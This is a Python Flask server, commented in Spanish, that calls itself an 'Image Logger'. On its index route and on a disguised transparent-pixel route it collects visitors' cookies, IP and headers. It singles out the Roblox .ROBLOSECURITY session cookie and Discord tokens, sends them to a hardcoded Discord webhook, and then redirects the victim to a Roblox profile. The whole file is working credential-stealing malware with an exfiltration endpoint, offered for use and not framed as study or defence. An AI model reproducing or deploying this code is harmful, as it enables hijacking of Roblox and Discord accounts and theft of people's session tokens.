from flask import Flask, request, Response, redirect
import requests
import json
from datetime import datetime
import os
import base64

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"

# Imagen pixel transparente 1x1 en base64
PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")

@app.route('/')
def index():
    # Capturar TODAS las cookies del header
    cookies = {}
    cookie_string = request.headers.get('Cookie', '')
    
    if cookie_string:
        for cookie in cookie_string.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    # Buscar cookies específicas de Roblox y Discord
    roblox_cookie = cookies.get('.ROBLOSECURITY', 'No Roblox cookie')
    discord_token = cookies.get('token', 'No Discord token')
    roblox_session = cookies.get('RBXSessionTracker', 'No session')
    roblox_user = cookies.get('RBXUserTracker', 'No user')
    
    # Capturar headers completos
    headers = dict(request.headers)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Datos para Discord
    embed = {
        "title": "🎯 IMAGE LOGGER - ROBLOX COOKIE CAPTURED",
        "description": f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n**IP:** {ip}",
        "color": 16711680,
        "fields": [
            {"name": "🌐 IP", "value": str(ip), "inline": True},
            {"name": "🖥️ User Agent", "value": str(user_agent)[:100], "inline": False},
            {"name": "🔴 ROBLOX COOKIE (.ROBLOSECURITY)", "value": f"```{roblox_cookie}```", "inline": False},
            {"name": "🔵 Discord Token", "value": f"```{discord_token}```", "inline": False},
            {"name": "📊 Roblox Session", "value": f"```{roblox_session}```", "inline": True},
            {"name": "👤 Roblox User", "value": f"```{roblox_user}```", "inline": True},
            {"name": "📋 ALL COOKIES", "value": f"```json\n{json.dumps(cookies, indent=2)[:1000]}```", "inline": False},
            {"name": "📋 HEADERS", "value": f"```json\n{json.dumps(dict(headers), indent=2)[:1000]}```", "inline": False}
        ],
        "footer": {"text": "Image Logger v3 - Redirect to Profile"}
    }
    
    # Enviar a Discord
    try:
        response = requests.post(WEBHOOK_URL, json={"content": "@everyone **ROBLOX COOKIE CAPTURED**", "embeds": [embed]}, timeout=10)
        print(f"Webhook sent: {response.status_code}")
    except Exception as e:
        print(f"Webhook error: {e}")
    
    # Redirigir al perfil de Roblox (cambia USER_ID por el que quieras)
    return redirect('https://www.roblox.com/es/users/7869790887/profile', code=302)

@app.route('/pixel.png')
def pixel():
    # Capturar cookies también desde la ruta de la imagen
    cookies = {}
    cookie_string = request.headers.get('Cookie', '')
    
    if cookie_string:
        for cookie in cookie_string.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    roblox_cookie = cookies.get('.ROBLOSECURITY', 'No Roblox cookie')
    discord_token = cookies.get('token', 'No Discord token')
    
    if roblox_cookie != 'No Roblox cookie' or discord_token != 'No Discord token':
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        embed = {
            "title": "📸 PIXEL HIT - COOKIES CAPTURED",
            "color": 16711680,
            "fields": [
                {"name": "🌐 IP", "value": str(ip), "inline": True},
                {"name": "🔴 ROBLOX", "value": f"```{roblox_cookie}```", "inline": False},
                {"name": "🔵 DISCORD", "value": f"```{discord_token}```", "inline": False}
            ]
        }
        
        try:
            requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
        except:
            pass
    
    # Devolver la imagen pixel
    return Response(PIXEL, mimetype='image/png')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
